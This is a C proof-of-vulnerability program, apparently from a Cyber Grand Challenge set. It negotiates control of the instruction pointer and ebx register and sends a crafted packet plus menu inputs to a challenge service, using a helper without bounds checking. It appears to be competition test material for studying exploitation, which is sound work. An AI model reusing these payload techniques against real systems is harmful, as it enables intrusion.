/*
 * Copyright (c) 2014 Kaprica Security, Inc.
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 *
 */

#include <libpov.h>
#include "xlat.h"

#define transmit_str(_str) transmit_all(STDOUT, (_str), strlen((const char *)(_str)))
#define transmit_type2_byte(_pov) transmit_all(3, (_pov), sizeof(char))
#define transmit_type2_short(_pov) transmit_all(3, (_pov), sizeof(short))
#define transmit_type2_int(_pov) transmit_all(3, (_pov), sizeof(int))
#define transmit_type2(_pov, _size) transmit_all(3, (_pov), (_size))

// STOLEN FROM CROMU sample (not owned by Kaprica)
// itoa - Does not check output buffer size.
// Can potentially write up to 12 characters ("-2147483648\0") to str.
void itoa(char *str, int i)
{
    char buffer[11];
    int pos = 0;
    int outpos = 0;
    int neg = 0;
    if (i < 0)
    {
        neg = 1;
        i = -i;
    }
    do
    {
        buffer[pos++] = '0' + i % 10;
        i /= 10;
    } while (i > 0);

    if (neg == 1)
    {
        buffer[pos++] = '-';
    }
    if (str == NULL)
    {
        return;
    }

    while(outpos < pos)
    {
        str[outpos] = buffer[pos - outpos - 1];
        outpos ++;
    }
    str[outpos] = '\0';
}

void read_until_line(char *line)
{
    unsigned char *resp = NULL;
    unsigned int resp_len = 0;
    int ready = 0;
    while (!ready) {
        delimited_read(STDIN, &resp, &resp_len, (unsigned char *)"\n", 1);
        transmit_all(STDERR, resp, resp_len);
        if (memcmp(resp, line, strlen(line)) == 0) {
            ready = 1;
        }
    }
}


unsigned char readch()
{
    unsigned char c;
    length_read(STDIN, &c, 1);
    transmit_all(STDERR, &c, 1);
    return c;
}

type1_vals negotiate_type_1(unsigned int reg_num)
{
    /*
       0 - eax
       1 - ecx
       2 - edx
       3 - ebx
       4 - esp
       5 - ebp
       6 - esi
       7 - edi
    */

    unsigned int eip_mask = 0x00ffffff;
    unsigned int reg_mask = 0x00ffffff;
    type1_vals t1;

    type1_negotiate(eip_mask, reg_mask, reg_num, &t1);

    return t1;
}

type2_vals negotiate_type_2()
{
    type2_vals t2;
    type2_negotiate(&t2);
    return t2;
}

int main()
{
    char pkt[256];
    unsigned int reg_num = 3; //ebx
    type1_vals t1 = negotiate_type_1(reg_num);
    xlat_seed("2e0715f1709c");
    transmit_all(STDOUT, "1234", 4); // dummy
    transmit_all(STDOUT, "1\n", 2);
    strcpy(pkt, "-1198485360, ");
    itoa(&pkt[strlen(pkt)], t1.ipval);
    strcpy(&pkt[strlen(pkt)], ", -1148153712, ");
    itoa(&pkt[strlen(pkt)], t1.regval);
    strcpy(&pkt[strlen(pkt)], ", -1869553409, -1869574000, -1869574000, -1869574000,;;\n");
    transmit_all(STDOUT, pkt, strlen(pkt));
    transmit_all(STDOUT, "2\n", 2);
    transmit_all(STDOUT, "131;\n", 5);
    transmit_all(STDOUT, "6\n", 2);
    transmit_all(STDOUT, "3\n", 2);
    transmit_all(STDOUT, "0\n", 2);

    return 0;
}
